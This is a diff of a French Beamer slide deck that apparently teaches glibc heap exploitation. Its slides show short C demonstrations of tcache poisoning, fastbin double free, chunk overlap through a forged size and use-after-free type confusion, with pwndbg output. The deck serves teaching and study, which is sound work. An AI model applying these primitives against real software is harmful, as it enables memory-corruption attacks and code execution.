@@ -117,9 +117,16 @@
 \section{Introduction et Fondamentaux (4 min)}
 
 \begin{frame}{Objectif}
+
+    \begin{itemize}
+        \item Fonctionnement de malloc
+        \item 5 Techniques d'exploitation
+    \end{itemize}
 \end{frame}
 
 \begin{frame}{ptmalloc2}
+
+
 \end{frame}
 
 \begin{frame}{Chunk}
@@ -153,18 +160,18 @@
         \end{column}
     \end{columns}
     \vspace{-1.5em}
-    
+
     \begin{ccode}
-long *a = malloc(0x20); free(a); // 'a' dans Tcache
-*a = 0xdeadbeef;                 // UAF : fd corrompu !
-malloc(0x20);                    // Dépile 'a'
-long *target = malloc(0x20);     // Ciblera 0xdeadbeef !
+        long *a = malloc(0x20); free(a); // 'a' dans Tcache
+        *a = 0xdeadbeef;                 // UAF : fd corrompu !
+        malloc(0x20);                    // Dépile 'a'
+        long *target = malloc(0x20);     // Ciblera 0xdeadbeef !
     \end{ccode}
     \vspace{-1.5em}
 
     \begin{pwndbg}[tcachebins]{text}
-tcachebins
-  0x20 [  2]: 0x5...010 @\textcolor{pwndbgblue}{->}@ @\textcolor{pwndbgred}{0xdeadbeef}@
+        tcachebins
+        0x20 [  2]: 0x5...010 @\textcolor{pwndbgblue}{->}@ @\textcolor{pwndbgred}{0xdeadbeef}@
     \end{pwndbg}
 \end{frame}
 
@@ -174,18 +181,18 @@ tcachebins
         \item Masquage cryptographique du Tcache Poisoning aveugle.
     \end{itemize}
     \vspace{0.1em}
-    
+
     \begin{columns}[T]
         \begin{column}{0.50\textwidth}
             \textbf{Formule algorithmique}
             \begin{itemize}
-                 \item $C = (L \gg 12) \oplus P$
-                 \item $L$ : L'adresse stockant le pointeur.
-                 \item $P$ : Le vrai pointeur ciblé.
-                 \item $C$ : Valeur stockée en RAM.
+                \item $C = (L \gg 12) \oplus P$
+                \item $L$ : L'adresse stockant le pointeur.
+                \item $P$ : Le vrai pointeur ciblé.
+                \item $C$ : Valeur stockée en RAM.
             \end{itemize}
         \end{column}
-        
+
         \begin{column}{0.46\textwidth}
             \textbf{L'impact sur l'attaquant}
             \begin{itemize}
@@ -270,18 +277,18 @@ tcachebins
     \vspace{-1.5em}
 
     \begin{ccode}
-long *a = calloc(0x20); long *b = calloc(0x20);
-free(a); free(b); free(a);
+        long *a = calloc(0x20); long *b = calloc(0x20);
+        free(a); free(b); free(a);
 
-long *c = calloc(0x20); // Bloc A
-long *d = calloc(0x20); // Bloc B
-long *e = calloc(0x20); // Bloc A ! (Contrôle zone c)
+        long *c = calloc(0x20); // Bloc A
+        long *d = calloc(0x20); // Bloc B
+        long *e = calloc(0x20); // Bloc A ! (Contrôle zone c)
     \end{ccode}
     \vspace{-1.5em}
 
     \begin{pwndbg}[bins]{text}
-fastbins
-  0x20: 0x5...93e0 @\textcolor{pwndbgblue}{->}@ 0x5...9400 @\textcolor{pwndbgblue}{<-}@ @\textcolor{pwndbgred}{0x5...93e0 (loop)}@
+        fastbins
+        0x20: 0x5...93e0 @\textcolor{pwndbgblue}{->}@ 0x5...9400 @\textcolor{pwndbgblue}{<-}@ @\textcolor{pwndbgred}{0x5...93e0 (loop)}@
     \end{pwndbg}
 \end{frame}
 
@@ -301,25 +308,25 @@ fastbins
         \end{column}
     \end{columns}
     \vspace{-1.5em}
-    
+
     \begin{ccode}
-long *p1 = malloc(0x80-8); long *p2 = malloc(0x500-8);
-long *p3 = malloc(0x80-8); malloc(0x10); // guard
+        long *p1 = malloc(0x80-8); long *p2 = malloc(0x500-8);
+        long *p3 = malloc(0x80-8); malloc(0x10); // guard
 
-*(p2 - 1) = 0x581; // OVERFLOW (size altée)
-free(p2); // p2 dans l'Unsorted Bin avec fausse taille
+        *(p2 - 1) = 0x581; // OVERFLOW (size altée)
+        free(p2); // p2 dans l'Unsorted Bin avec fausse taille
 
-long *p4 = malloc(0x580 - 8); // Chevauche p3 !
-memset(p4, '4', 0x580 - 8);   // Écrase p3 en silence
+        long *p4 = malloc(0x580 - 8); // Chevauche p3 !
+        memset(p4, '4', 0x580 - 8);   // Écrase p3 en silence
     \end{ccode}
     \vspace{-1.5em}
 
     \begin{pwndbg}[heap]{text}
-0x5...000 0x...081 (p1)
-0x5...080 @\textcolor{pwndbgred}{0x0...581}@ (p2 corrompu, taille \textit{fake} 0x580)
-0x5...580 0x0...081 (p3 originel non modifié)
-...       
-0x5...600 0x3434343434343434 (p4 et p3 tapent ici !)
+        0x5...000 0x...081 (p1)
+        0x5...080 @\textcolor{pwndbgred}{0x0...581}@ (p2 corrompu, taille \textit{fake} 0x580)
+        0x5...580 0x0...081 (p3 originel non modifié)
+        ...
+        0x5...600 0x3434343434343434 (p4 et p3 tapent ici !)
     \end{pwndbg}
 \end{frame}
 
@@ -339,25 +346,25 @@ memset(p4, '4', 0x580 - 8);   // Écrase p3 en silence
         \end{column}
     \end{columns}
     \vspace{-2.0em}
-    
+
     \begin{ccode}
-typedef struct { void (*execute)(); } task_t; // 8 octets
-typedef struct { char content[8]; } msg_t;    // 8 octets
+        typedef struct { void (*execute)(); } task_t; // 8 octets
+        typedef struct { char content[8]; } msg_t;    // 8 octets
 
-task_t *task = malloc(sizeof(task_t)); task->execute = lose;
-free(task); // UAF: dangling pointer !
+        task_t *task = malloc(sizeof(task_t)); task->execute = lose;
+        free(task); // UAF: dangling pointer !
 
-msg_t *msg = malloc(sizeof(msg_t)); // Allocation même taille
-*(long *)msg->content = (long)win;  // Type Confusion
+        msg_t *msg = malloc(sizeof(msg_t)); // Allocation même taille
+        *(long *)msg->content = (long)win;  // Type Confusion
 
-task->execute(); // Exécute win() !
+        task->execute(); // Exécute win() !
     \end{ccode}
     \vspace{-2.0em}
 
     \begin{pwndbg}[stack]{text}
-00:0000| rsp 0x7ffd...440 {a} @\textcolor{pwndbgblue}{->}@ 0x7ffd...460 {fake\_chunks+0x10}
-...
-01:0008|     0x7ffd...448 {b} @\textcolor{pwndbgblue}{->}@ 0x7ffd...460 {fake\_chunks+0x10}
+        00:0000| rsp 0x7ffd...440 {a} @\textcolor{pwndbgblue}{->}@ 0x7ffd...460 {fake\_chunks+0x10}
+        ...
+        01:0008|     0x7ffd...448 {b} @\textcolor{pwndbgblue}{->}@ 0x7ffd...460 {fake\_chunks+0x10}
     \end{pwndbg}
 \end{frame}
 
@@ -378,7 +385,7 @@ task->execute(); // Exécute win() !
         \item Règle stricte bilatérale : \texttt{P->fd\_nextsize->bk\_nextsize == P}
     \end{itemize}
     \vspace{0.1cm}
-    
+
     \textbf{GLIBC 2.43 (Janvier 2026)}
     \vspace{-0.2cm}
     \begin{itemize}
@@ -397,7 +404,7 @@ task->execute(); // Exécute win() !
         \item Arbitrary Write devient coûteux (multiples fuites nécessaires : `heap`, `libc`).
     \end{itemize}
     \vspace{0.4cm}
-    
+
     \textbf{Pivot vers la corruption applicative}
     \vspace{-0.2cm}
     \begin{itemize}
